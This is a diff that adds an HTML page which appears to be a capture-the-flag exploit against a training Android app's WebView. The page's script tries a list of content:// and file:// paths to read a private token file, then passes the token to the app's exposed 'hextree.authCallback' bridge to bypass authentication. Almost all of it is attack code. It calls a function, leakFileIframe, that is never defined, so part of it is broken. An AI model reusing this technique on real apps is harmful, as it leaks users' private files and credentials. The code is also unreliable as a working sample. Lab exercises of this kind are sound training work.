@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Flag40 Exploit</title>
+</head>
+<body>
+    <h1>WebView Exploit in Progress...</h1>
+    <div id="status">Loading...</div>
+    
+    <script>
+        let tokenFound = false;
+        
+        // Enhanced XHR file reading function
+        function leakFileXHR(url) {
+            const xhr = new XMLHttpRequest();
+            xhr.open('GET', url, true);
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState === 4 && xhr.responseText && !tokenFound) {
+                    console.log('XHR Token found:', xhr.responseText);
+                    document.getElementById('status').innerHTML = 'Token found via XHR: ' + xhr.responseText.substring(0, 10) + '...';
+                    attemptAuth(xhr.responseText.trim());
+                    tokenFound = true;
+                }
+            };
+            xhr.onerror = function(error) {
+                console.log('XHR error for:', url);
+            };
+            xhr.send();
+        }
+        
+   
+        
+        
+        // Function to attempt authentication with token
+        function attemptAuth(token) {
+            if (!token || tokenFound) return;
+            
+            console.log('Attempting authentication with token:', token);
+            
+            // Call the exposed JavaScript interface
+            if (window.hextree && window.hextree.authCallback) {
+                try {
+                    window.hextree.authCallback(token);
+                    document.getElementById('status').innerHTML = 'Authentication callback sent successfully!';
+                    console.log('Authentication callback executed');
+                } catch (e) {
+                    console.error('Error calling authCallback:', e);
+                    document.getElementById('status').innerHTML = 'Error calling authentication callback';
+                }
+            } else {
+                document.getElementById('status').innerHTML = 'JavaScript interface not available';
+                console.log('hextree interface not found');
+            }
+        }
+        
+        // Multiple file path attempts
+        const filePaths = [
+            'content://io.hextree.attacksurface/files/token.txt',
+            'content://io.hextree.attacksurface.fileprovider/files/token.txt',
+            'file:///android_asset/token.txt',
+            'file:///sdcard/Android/data/io.hextree.attacksurface/files/token.txt',
+            'file:///storage/emulated/0/Android/data/io.hextree.attacksurface/files/token.txt'
+        ];
+        
+        // Start the attack
+        function startAttack() {
+            document.getElementById('status').innerHTML = 'Starting file leak attempts...';
+            
+            // Try all file paths with both methods
+            filePaths.forEach((path, index) => {
+                setTimeout(() => {
+                    console.log('Trying XHR for:', path);
+                    leakFileXHR(path);
+                }, index * 200);
+                
+                setTimeout(() => {
+                    console.log('Trying iframe for:', path);
+                    leakFileIframe(path);
+                }, index * 200 + 100);
+            });
+        }
+        
+        // Initialize
+        window.onload = function() {
+            console.log('Page loaded, available interfaces:', Object.keys(window));
+            if (window.hextree) {
+                console.log('Hextree interface methods:', Object.keys(window.hextree));
+            }
+            
+            // Start attack after a brief delay
+            setTimeout(startAttack, 200);
+        };
+    </script>
+</body>
+</html>
